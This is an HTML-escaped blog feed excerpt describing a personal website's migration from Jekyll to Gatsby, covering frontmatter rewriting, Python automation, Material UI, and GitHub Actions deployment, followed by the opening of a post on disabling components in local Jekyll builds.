&lt;h3 id=&quot;existing-blogs&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#existing-blogs&quot; aria-label=&quot;existing blogs permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Existing Blogs&lt;/h3&gt;
&lt;p&gt;Since I already had content I needed to migrate it to a new framework. Since my original website was pretty small, this was mainly about 20 blog posts - all written in markdown with frontmatter used by Jekyll to create the HTML pages using templates.&lt;/p&gt;
&lt;p&gt;I was hoping to not modify any of this content - to save time. I wanted to copy all the blog posts to a folder in my new Gatsby project, and it would create some lovely HTML blog posts. Think I was dreaming about this working well! To give you an idea of the front matter, here is an excerpt of what I started with:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;---
layout: post
title: &quot;Metasploitable3 - Pentesting the Ubuntu Linux Version (Part 1: SQL Injection)&quot;
tags:
- Metasploitable3
- PenTesting
- SQL Injection
thumbnail_path: blog/thumbs/padlock.png
---&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If I was better at GraphQL when I started this process, I probably could have achieved this transition with not too much problem. I found lots of tutorials:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gatsbyjs.com/blog/2017-11-08-migrate-from-jekyll-to-gatsby/&quot;&gt;Migrate from Jekyll to Gatsby&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://medium.com/javascript-in-plain-english/from-jekyll-to-gatsby-7-simple-steps-98e0b7a5ead2&quot;&gt;From Jekyll to Gatsby: 7 Simple Steps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.acuriousanimal.com/blog/2019/10/03/from-jekyll-to-gatsby&quot;&gt;How I migrated my site from Jekyll to Gatsby&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I ended up wanting to change so many things, adding more fields (e.g. redirects, blog description, and date) that rewriting the frontmatter manually seemed easier. This is a snippet from the same post as displayed above, with updated fields.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;---
title: Metasploitable3 - Pentesting the Ubuntu Linux Version (Part 1)
description: Walkthrough of Pentesting the Metasploitable3 Ubuntu Linux version using SQL Injection.
tags: [&quot;Metasploitable3&quot;, &quot;Pentesting&quot;, &quot;SQL Injection&quot;]
thumbnail: metasploitable3.png
date: 2018-07-08
redirect_from:
  - blog/2018/07/08/metasploitable3-pentesting-the-ubuntu-linux-version-part1/
---&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This was a tough decision - to rewrite the frontmatter and change the blog URLs. FYI - I used the &lt;code class=&quot;language-text&quot;&gt;gatsby-plugin-meta-redirect&lt;/code&gt; Gatsby plugin to do this based on the &lt;code class=&quot;language-text&quot;&gt;redirect&lt;/code&gt; value in the frontmatter.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lesson learned:&lt;/strong&gt; Sometimes taking a more manual approach may be the better option in the end. It gave me the option to change things I wouldn’t have otherwise changed.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;automating-markdown-changes&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#automating-markdown-changes&quot; aria-label=&quot;automating markdown changes permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Automating Markdown Changes&lt;/h3&gt;
&lt;p&gt;For those who have used Jekyll, they might know that it uses &lt;a href=&quot;https://jekyllrb.com/docs/liquid/&quot;&gt;Liquid&lt;/a&gt; templating language to process templates. You can handle do things like declare variables and use if/else logic. Problem: It needs to be changed to work with Gatsby.&lt;/p&gt;
&lt;p&gt;Maybe I have a problem with automating everything. I knew this was a one-off - but I thought I could write some scripts to change markdown quicker than I could change them manually. I think that with 20 blog posts, this was right on the border of whether it could be useful to automate. Any more and automation would be the best option, any less and it wouldn’t. But I guess it depends on how quickly you can whip up a couple of simple scripts. Python is my go-to language - so this only took about an hour. &lt;/p&gt;
&lt;p&gt;For those doing a similar transition from Jekyll to Gatsby here is a list of things I changed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Syntax highlighting syntax&lt;/li&gt;
&lt;li&gt;Image inclusion syntax&lt;/li&gt;
&lt;li&gt;Markdown frontmatter&lt;/li&gt;
&lt;li&gt;Table of contents syntax&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To give a little idea of things that needed changing… A before and after example of syntax highlighting:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Before: {% highlight sql %}&lt;/li&gt;
&lt;li&gt;After: ```sql&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I automated this by simply finding and replacing text in Python. Some regex was used, but that was only because I have written lots of regex lately, and found it quick! For once! Overall, this made the changed much more tolerable (for me personally).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lesson learned:&lt;/strong&gt; Automating can sometimes not be worth it. But if you like automating more than manually doing stuff, it can make life more fun!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;designing-the-portfolio-and-blog&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#designing-the-portfolio-and-blog&quot; aria-label=&quot;designing the portfolio and blog permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Designing the Portfolio and Blog&lt;/h2&gt;
&lt;p&gt;At this point, I had a bunch of existing blog posts written in Markdown that had all been updated to work well in Gatsby. Time to start developing the website.&lt;/p&gt;
&lt;h3 id=&quot;choosing-a-component-framework&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#choosing-a-component-framework&quot; aria-label=&quot;choosing a component framework permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Choosing a Component Framework&lt;/h3&gt;
&lt;p&gt;Ease of development! When it comes to full-stack, I like to chill in the back seat, more than riding upfront. Translation: I am not very good at web development, it isn’t my favorite thing to do. But I like learning more! Also… this is 2021, so I want some help! The new portfolio/blog I wanted should look good, be non-generic, and quick to develop. So choosing a component library was important to me to help speed up development. This may not always be the case and may depend on your experience, time available, and dedication.&lt;/p&gt;
&lt;p&gt;If you haven’t heard of the term &lt;em&gt;component library&lt;/em&gt;, my informal definition is: a standardized library of useful things to build your website. Where &lt;em&gt;things&lt;/em&gt; are stuff like buttons, nav menus, loading indicators, and layout controls. So, instead of writing and styling everything from scratch, you get a &lt;strong&gt;big&lt;/strong&gt; helping hand.&lt;/p&gt;
&lt;p&gt;There is no shortage of options available. This is indicated by &lt;a href=&quot;https://blog.logrocket.com/top-10-react-component-libraries-for-2020/&quot;&gt;Top 10 React Component Libraries for 2020&lt;/a&gt;. Seems like every React thing I search for has a Top 10 list of options! Anyway, picking one can be daunting. Some of the options I weighted up were:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://react-bootstrap.github.io/&quot;&gt;React Bootstrap&lt;/a&gt;: I had used Bootstrap4 in the past and it seemed like a good option&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://ant.design/&quot;&gt;Ant Design&lt;/a&gt;: I keep reading comments on Reddit of devs who love Ant Design&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://material-ui.com/&quot;&gt;Material UI&lt;/a&gt;: I have a half-finished dashboard using Material UI and I like using it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Similar to picking the right React framework for the blog (Gatsby vs NextJS), I used the same method. &lt;a href=&quot;https://reactjs.org/docs/create-a-new-react-app.html&quot;&gt;Create a New React App&lt;/a&gt; and install each component library and try it out. In the end, Material UI was the winner. Why? I had used it before, and the experience I had could speed up development time. This meant I could take more time learning Gatsby and GraphQL instead, as well as focussing on the smaller things.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lesson learned:&lt;/strong&gt; Choosing a good component library can make life much easier, speeding up development time. The downside is you can get stuck with a generic style that might be hard to modify.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;finding-inspiration&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#finding-inspiration&quot; aria-label=&quot;finding inspiration permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Finding Inspiration&lt;/h3&gt;
&lt;p&gt;I am by no means naturally proficient in design or UX. I can do it with lots of time and redesign. But it is not something I have trained in. I barely take in website aesthetics when I am browsing, so I am coming to the table with minimal knowledge. This means getting design inspiration is essential.&lt;/p&gt;
&lt;p&gt;I started by reading articles like &lt;a href=&quot;https://codeburst.io/10-awesome-web-developer-portfolios-d266b32e6154&quot;&gt;10 Awesome Web Developer Portfolios&lt;/a&gt; and &lt;a href=&quot;https://www.freecodecamp.org/news/15-web-developer-portfolios-to-inspire-you-137fb1743cae/&quot;&gt;15 Web Developer Portfolios to Inspire You&lt;/a&gt;. These articles are pretty good and do provide lots of examples. I found one especially beautiful portfolio from &lt;a href=&quot;https://www.adhamdannaway.com/&quot;&gt;Adham Dannaway&lt;/a&gt; that I took lots of inspiration from. I liked some parts of Adham’s portfolio and how he visually displayed information.&lt;/p&gt;
&lt;p&gt;However, just a few good portfolio examples were not sufficient for me. I recently noticed that lots of emerging or aspiring developers post their new portfolios on the &lt;code class=&quot;language-text&quot;&gt;/r/webdev&lt;/code&gt; Reddit - and other similar subreddits. I looked for posts containing &lt;code class=&quot;language-text&quot;&gt;portfolio&lt;/code&gt; and did some research. The best part about this is that the (mostly) lovely and caring Reddit communities post a really good feedback to the author. This info was priceless, and I learned lots of pro tips.&lt;/p&gt;
&lt;h3 id=&quot;redesigning-everything&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#redesigning-everything&quot; aria-label=&quot;redesigning everything permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Redesigning Everything&lt;/h3&gt;
&lt;p&gt;I don’t want to go into detail about how I went about redesigning my website - just a high-level overview. The source code is stored on GitHub in my &lt;a href=&quot;https://github.com/thomaslaurenson/thomaslaurenson.github.io&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;thomaslaurenson.github.io&lt;/code&gt; repository&lt;/a&gt;. Feel free to check it out and see how I went about implementing some specific things. Instead, I will write some separate blog posts that target specific implementation steps that I couldn’t find much information on the Internet.&lt;/p&gt;
&lt;p&gt;As a summary, here is a screenshot of the new blog being tested on Chrome Lighthouse. Some pretty good gains in all areas.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/97abf8d11d63b432f3420cdbb29c8396/91b29/new-gatsby-blog-lighthouse.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 43.0379746835443%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAC4jAAAuIwF4pT92AAAB8ElEQVQoz5WSTWsTYRDHd0tCC4KXSo14CQEvfoJ+Cj+CF0/2YMGjd29e68lCTOwhHhKSCBZDPSVNqS20GMgLEpOAyaabTXY3u8m+JT83D1qKHsR5+DMzzzPzf2aGke5ubXFnc5NYLIYsy0iS9Bei0SiJRIJms4kyVOh2u3xrd2m2OqiahmEYDBSFyWSCVCqVODw8pPSpRD6fJ5vNXiOXywldLBQpfigy+t7BuNIYDhTUH1eYuoVnO8ztGf7MxZ5aSPyHKKZKO1AZ+xYtT8FYzGj5QyaBTXsxom+oSF9OTzk/O+ekesJxpUKj3qD2tcblxSXNRoOz8M2yLObWjPqkx9GsTscdUTQv6HkaH2c1er5GaV6nPuoiFQsFqsdVPh8dUS6XxTwM3UDXdWzLRp/oLMPjOI6wzamJM5+LON/zUVWVRRDguE4Y/4+WlwRCj7WxqPKmLBYLhsMhnuexXC7F3cqWUrkUB/kD0pk06XSa1NsUyWSS/f03ZN/lyaTfs/d6j0o4jt9EK1lVPBgMCILg+hPXdcOtuB2uRjxELMT6jVWRNni1neFJ/IXwd57uiCT/F4HjuPT7IaHv/0F4TyLyMIL8QEa+L7N2a00QrEc2eL79kkfxx8LffbYrkoKQaD61CdwplqGhuzamaYaVL0XLPwEfTUhy0qcg0QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;New Gatsby powered blog with Chrome Lighthouse results&quot;
        title=&quot;New Gatsby powered blog with Chrome Lighthouse results&quot;
        src=&quot;/static/97abf8d11d63b432f3420cdbb29c8396/f058b/new-gatsby-blog-lighthouse.png&quot;
        srcset=&quot;/static/97abf8d11d63b432f3420cdbb29c8396/c26ae/new-gatsby-blog-lighthouse.png 158w,
/static/97abf8d11d63b432f3420cdbb29c8396/6bdcf/new-gatsby-blog-lighthouse.png 315w,
/static/97abf8d11d63b432f3420cdbb29c8396/f058b/new-gatsby-blog-lighthouse.png 630w,
/static/97abf8d11d63b432f3420cdbb29c8396/40601/new-gatsby-blog-lighthouse.png 945w,
/static/97abf8d11d63b432f3420cdbb29c8396/91b29/new-gatsby-blog-lighthouse.png 983w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;deploying-a-gatsby-blog-on-github-pages&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#deploying-a-gatsby-blog-on-github-pages&quot; aria-label=&quot;deploying a gatsby blog on github pages permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Deploying a Gatsby Blog on GitHub Pages&lt;/h2&gt;
&lt;p&gt;The final part of the website redesign was to find an easy way to deploy the production build of Gatsby to &lt;a href=&quot;https://docs.github.com/en/github/working-with-github-pages/about-github-pages&quot;&gt;GitHub pages&lt;/a&gt;. Why GitHub Pages? Free, easy, fast content delivery and my current website were deployed the same way. With Jekyll, you can just push to &lt;code class=&quot;language-text&quot;&gt;master&lt;/code&gt;, and the website will be build and deployed. Magic! Gatsby is not as easy but is very manageable.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/features/actions&quot;&gt;GitHub Actions&lt;/a&gt; seems to be the hot new thing out. I have been using it a little to automate builds and deploys of other projects. So it was my automatic decision. This was against the advice from the Gatsby docs on &lt;a href=&quot;https://www.gatsbyjs.com/docs/how-to/previews-deploys-hosting/how-gatsby-works-with-github-pages/&quot;&gt;How Gatsby Works with GitHub Pages&lt;/a&gt; - who recommend using the &lt;code class=&quot;language-text&quot;&gt;gh-pages&lt;/code&gt; package and something like:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;npm install gh-pages --save-dev
gatsby build &amp;&amp; gh-pages -d public -b master&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nothing wrong with this solution, in fact, it is pretty cool! See the tutorial linked above for a complete rundown of this method. But I wanted to do some CI/CD stuff and keep learning GitHub actions. They have a Travis CI example, but due to the pricing changes of Travis - I have stopped using them. So Actions it was.&lt;/p&gt;
&lt;p&gt;I found a very simple Action on the Marketplace called &lt;a href=&quot;https://github.com/marketplace/actions/gatsby-publish&quot;&gt;Gatsby Publish&lt;/a&gt;. These Actions make it very simple to put together an extensible process to build, test and deploy code. I barely changed the code in the Action example. My final solution is listed below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yml&quot;&gt;&lt;pre class=&quot;language-yml&quot;&gt;&lt;code class=&quot;language-yml&quot;&gt;&lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; Gatsby Publish

&lt;span class=&quot;token key atrule&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token key atrule&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token key atrule&quot;&gt;branches&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; dev

&lt;span class=&quot;token key atrule&quot;&gt;jobs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token key atrule&quot;&gt;runs-on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; ubuntu&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;latest
    &lt;span class=&quot;token key atrule&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; actions/checkout@v1
      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; enriikke/gatsby&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;gh&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;pages&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;action@v2
        &lt;span class=&quot;token key atrule&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;token key atrule&quot;&gt;access-token&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; secrets.ACCESS_TOKEN &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The only change I made was pushing my website project code to a new branch named &lt;code class=&quot;language-text&quot;&gt;dev&lt;/code&gt;, which then publishes the building website to the master branch when changes are made. Easy!&lt;/p&gt;
&lt;h2 id=&quot;conslusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conslusion&quot; aria-label=&quot;conslusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conslusion&lt;/h2&gt;
&lt;p&gt;Hope you got this far or at least got something interesting from this blog post. I usually do a more technical write-up, but I thought that this experience earned some high-level discussion of how I went about the migration from different frameworks. There is so much information, documentation, and tutorials that it is hard to make decisions, or knowing which option may suit you the most. The entire process was fun and rewarding. Hopefully, it encourages me to start blogging again.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Disabling Components on Local Jekyll Builds]]></title><description><![CDATA[This post documents a simple, yet powerful, technique to enable or disable specific website content on Jekyll-powered websites.  Contents…]]></description><link>https://thomaslaurenson.com/blog/2018-09-14/disabling-components-local-jekyll-builds/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-09-14/disabling-components-local-jekyll-builds/</guid><pubDate>Fri, 14 Sep 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post documents a simple, yet powerful, technique to enable or disable specific website content on Jekyll-powered websites. &lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#default-jekyll-environment-values&quot;&gt;Default Jekyll Environment Values&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#disabling-google-analytics-in-local-jekyll-development&quot;&gt;Disabling Google Analytics in Local Jekyll Development&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#disabling-google-adsense-in-local-jekyll-development&quot;&gt;Disabling Google Adsense in Local Jekyll Development&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#disabling-disqus-comments-in-local-jekyll-development&quot;&gt;Disabling Disqus Comments in Local Jekyll Development&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
